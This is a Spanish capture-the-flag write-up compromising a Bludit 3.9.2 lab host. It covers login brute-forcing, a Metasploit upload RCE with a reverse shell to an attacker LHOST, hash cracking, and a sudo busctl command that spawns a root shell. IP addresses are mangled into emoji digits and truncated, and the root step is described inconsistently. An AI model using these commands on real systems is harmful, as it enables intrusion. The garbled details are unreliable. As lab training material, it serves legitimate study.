
# 💀 [WRITEUP] JAULACON2025: Objetivo Bludit

---

## 1️⃣. Fase de Reconocimiento y Descubrimiento de Vectores

Iniciamos la intrusión desplegando nuestro arsenal de escaneo sobre el host objetivo. El comando `recon` mapeó la superficie de ataque, exponiendo los siguientes puntos de entrada expuestos:

*   **Puerto 2️⃣2️⃣/TCP (SSH):** Ejecutando `OpenSSH 9️⃣.2️⃣p1️⃣` bajo plataforma `Debian`.
*   **Puerto 8️⃣0️⃣/TCP (HTTP):** Servidor web `Apache httpd 2️⃣.4️⃣.6️⃣2️⃣` (`Debian`) sirviendo una instancia activa de `Bludit CMS`.

*   **Identificamos la IP con el Dominio jaulacon2025.thl/ `sudo nano /etc/host`.

### 1️⃣.2️⃣. Enumeracion web 
En el momento de enumerar los activos web expuso `--> http://jaulacon2025.thl/admin/` y `--> http://jaulacon2025.thl/cgi-bin`

### 1️⃣.3️⃣. Huella Digital: Identificación del CMS

Al auditar los activos web expuestos en `http://1️⃣9️⃣2️⃣.1️⃣6️⃣8️⃣`, interceptamos y confirmamos que el servicio HTTP corre bajo el motor de `Bludit CMS` específicamente en su versión vulnerable `3️⃣.9️⃣.2️⃣`.


---

## 2️⃣. Fuerza Bruta Orientada a Objetos: Bypass de Mitigación

### 2️⃣.1️⃣. Armamento del Script Personalizado

El panel de administración (`/admin/login`) cuenta con defensas nativas contra ataques de fuerza bruta. Para evadir este mecanismo, desplegamos un exploit personalizado en Python ([Source Code](https://github.com/CuriosidadesDeHackers/Bludit-3.9.2-Auth-Bypass/tree/main)) diseñado por nuestra célula para interceptar y reciclar dinámicamente los tokens anti-CSRF por cada intento de login.

**Parámetros de Configuración del Vector:**
*   **Target URI:** `http://1️⃣9️⃣2️⃣.1️⃣6️⃣8️⃣/admin/login`
*   **Diccionario de Usuarios:** `user.txt` (Inyectando el usuario `Jaulacon2️⃣0️⃣2️⃣5️⃣`, extraído mediante OSINT de la web).
*   **Diccionario de Contraseñas:** `/usr/share/wordlists/rockyou.txt`

**Mecánica de Ejecución:**
1️⃣. El script extrae el token CSRF válido de la sesión actual.
2️⃣. Inyecta el payload de credenciales en paralelo.
3️⃣. Filtra las respuestas HTTP para aislar las credenciales que otorgan acceso exitoso.

### 2️⃣.2️⃣. Éxito de la Extracción

El mecanismo defensivo colapsó ante el ataque, entregando las siguientes credenciales en texto plano:
*   **User:** `Jaulacon2️⃣0️⃣2️⃣5️⃣`
*   **Pass:** `cassandra`

---

## 3️⃣. Infiltración de Código y Ejecución Remota (RCE)

### 3️⃣.1️⃣. Búsqueda y Selección de Armamento en Metasploit

Consultamos la base de datos de exploits en busca de vulnerabilidades conocidas para esta versión de Bludit. Localizamos el módulo `bludit_upload_images_exec`, el cual aprovecha una falla de sanitización en la subida de imágenes para lograr la ejecución arbitraria de código.

```bash
msfconsole -q
search bludit
use exploit/linux/http/bludit_upload_images_exec
```

### 3️⃣.2️⃣. Configuración de Cargas Útiles

Establecimos las variables del exploit para dirigir la carga destructiva al objetivo:

```bash
set RHOSTS 1️⃣9️⃣2️⃣.1️⃣6️⃣8️⃣
set BLUDITUSER Jaulacon2️⃣0️⃣2️⃣5️⃣
set BLUDITPASS cassandra
set LHOST 1️⃣9️⃣2️⃣.1️⃣6️⃣8️⃣.1️⃣8️⃣.2️⃣0️⃣
set LPORT 4️⃣4️⃣4️⃣4️⃣
```

### 3️⃣.3️⃣. Ejecución del Paypload e Infiltración

Lanzamos el exploit (`exploit`), evadiendo las restricciones de subida e inyectando nuestra shell reversa. El servidor web procesó el archivo malicioso, devolviéndonos una sesión de **Meterpreter**.

*   **Identidad Obtenida:** `www-data` (Privilegios limitados del servidor web).
*   **Entorno:** Confirmamos de primera mano la persistencia en `Bludit v3️⃣.9️⃣.2️⃣`.
<img width="1920" height="1044" alt="msfconsole" src="https://github.com/user-attachments/assets/1ed26650-2278-4a3d-99e9-44f8a8119907" />

---

## 4️⃣. Escalada de Privilegios Post-Explotación

### 4️⃣.1️⃣. Exfiltración de la Base de Datos Local

Buscando vectores locales para elevar privilegios, inspeccionamos los archivos de configuración en el core del CMS. Extrajimos el fichero confidencial `users.php` ubicado en `/var/www/html/bl-content/databases/`. Dentro de la estructura, detectamos un hash crítico asignado al usuario `JaulaCon2️⃣0️⃣2️⃣5️⃣` utilizando la semilla (salt) explícita: `'jejeje'`.

### 4️⃣.2️⃣. Ruptura del Criptograma

Sometimos el hash obtenido (`5️⃣5️⃣1️⃣2️⃣1️⃣1️⃣bcd6️⃣ef1️⃣8️⃣e3️⃣2️⃣7️⃣4️⃣2️⃣a7️⃣3️⃣fcb8️⃣5️⃣4️⃣3️⃣0️⃣b`) a motores de descifrado masivo (CrackStation). El hash colisionó rápidamente, revelando su equivalencia original: `cassandra`.

### 4️⃣.3️⃣. Movimiento Lateral vía SSH

Con las credenciales del sistema en nuestro poder, abandonamos la inestable sesión web y ganamos una tty interactiva y segura mediante SSH:

```bash
ssh JaulaCon2️⃣0️⃣2️⃣5️⃣@1️⃣9️⃣2️⃣.1️⃣6️⃣8️⃣
```

### 4️⃣.4️⃣. Escalada Definitiva a Root (Pwnage Completo)

Ejecutamos una auditoría de privilegios `sudo` para verificar qué binarios podíamos ejecutar con permisos elevados:

```bash
sudo -l
```

El sistema reportó que el usuario `JaulaCon2️⃣0️⃣2️⃣5️⃣` puede ejecutar el binario `/usr/bin/busctl` como `root` sin requerir contraseña. Este binario del sistema se comunica con el bus D-Bus y permite invocar servicios del sistema. Explotamos esta mala configuración inyectando código a través del paginador interactivo para spawnear una shell de root pura.

**Comando de Explotación Ejecutado:**
```bash
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```

Al procesar el comando, el paginador invocó una shell saltándose las restricciones de privilegios. El sistema fue completamente subyugado.

```bash
whoami
> root
```
<img width="1920" height="267" alt="root" src="https://github.com/user-attachments/assets/3a74b292-9d49-4451-b944-e11dbae47bb8" />
